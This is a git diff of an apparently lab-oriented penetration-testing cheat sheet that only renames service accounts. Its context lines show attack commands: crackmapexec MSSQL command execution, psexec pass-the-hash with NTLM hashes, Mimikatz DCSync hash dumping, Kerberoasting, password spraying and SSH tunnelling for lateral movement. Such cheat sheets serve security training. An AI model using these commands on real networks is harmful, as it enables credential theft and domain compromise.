@@ -475,7 +475,7 @@ Microsoft Windows [Version 10.0.17763.1637]
 
 c:\windows\system32\inetsrv>whoami
 whoami
-svc\defaultsvc
+service\defaultservice
 ````
 ##### CMS 
 ###### WP Scan
@@ -919,14 +919,14 @@ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config
 ````
 ##### Crackmapexec
 ````
-proxychains crackmapexec mssql -d example.com -u sql_svc -p password123  -x "whoami" 10.10.126.148
-proxychains crackmapexec mssql -d example.com -u sql_svc -p password123  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'
+proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
+proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'
 
 ````
 ##### Logging in
 ````
 sqsh -S $IP -U sa -P CrimsonQuiltScalp193 #linux
-proxychains sqsh -S 10.10.126.148 -U example.com\\sql_svc -P password123 -D msdb #windows
+proxychains sqsh -S 10.10.126.148 -U example.com\\sql_service -P password123 -D msdb #windows
 ````
 ##### Expliotation
 ````
@@ -2278,11 +2278,11 @@ Lets say you have compromised host 192.168.236.147 which has access to 10.10.126
 ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
 ````
 ````
-sqsh -S 127.0.0.1 -U example.com\\sql_svc -P password123 -D msdb
+sqsh -S 127.0.0.1 -U example.com\\sql_service -P password123 -D msdb
 ````
 #### Bi-directional ssh tunnel
 ````
-In this example we are 192.168.45.191 attacking an AD exploit chain with internal/private IPs. We are able to get sql_svc creds on MS01 which can be used to login into MS02, once we login we cannot download any files or do any rce's so we have to setup a bi-directional ssh tunnel.
+In this example we are 192.168.45.191 attacking an AD exploit chain with internal/private IPs. We are able to get sql_service creds on MS01 which can be used to login into MS02, once we login we cannot download any files or do any rce's so we have to setup a bi-directional ssh tunnel.
 ````
 ##### arp -a
 ````
@@ -2321,10 +2321,10 @@ Sets up local port forwarding. It instructs SSH to listen on port 1433 on the lo
 ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
 ````
 ````
-In our next command we are able to login as the sql_svc on 10.10.126.148 (MS02) as if we were 192.168.236.147 (MS01)
+In our next command we are able to login as the sql_service on 10.10.126.148 (MS02) as if we were 192.168.236.147 (MS01)
 ````
 ````
-sqsh -S 127.0.0.1 -U example.com\\sql_svc -P password123 -D msdb
+sqsh -S 127.0.0.1 -U example.com\\sql_service -P password123 -D msdb
 ````
 ##### Reverse Port Foward
 ````
@@ -4079,7 +4079,7 @@ Address: 10.11.1.121
 ````
 impacket-psexec jess:Flowers1@172.16.138.11 cmd.exe
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Admin@192.168.129.59
-impacket-psexec -hashes lm:ntlm zensvc@192.168.183.170
+impacket-psexec -hashes lm:ntlm zenservice@192.168.183.170
 ````
 ###### WINRM
 ````
@@ -4117,7 +4117,7 @@ sudo proxychains crackmapexec winrm 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -
 sudo crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
 sudo crackmapexec winrm 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
 sudo crackmapexec winrm 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
-proxychains crackmapexec mssql -d example.com -u sql_svc -p password123  -x "whoami" 10.10.126.148
+proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
 ````
 ````
 .\kerbrute_windows_amd64.exe passwordspray -d example.com .\usernames.txt "password123"
@@ -4165,7 +4165,7 @@ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr
 To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file,1 which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
 ````
 lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
-lsadump::dcsync /user:zensvc #Pick a user with domain admin rights to crack the password or pass the hash
+lsadump::dcsync /user:zenservice #Pick a user with domain admin rights to crack the password or pass the hash
 ````
 ````
 Credentials:
@@ -4174,5 +4174,5 @@ Credentials:
     lm  - 0: 6ba75a670ee56eaf5cdf102fabb7bd4c
 ````
 ````
-impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zensvc@192.168.183.170
+impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zenservice@192.168.183.170
 ````
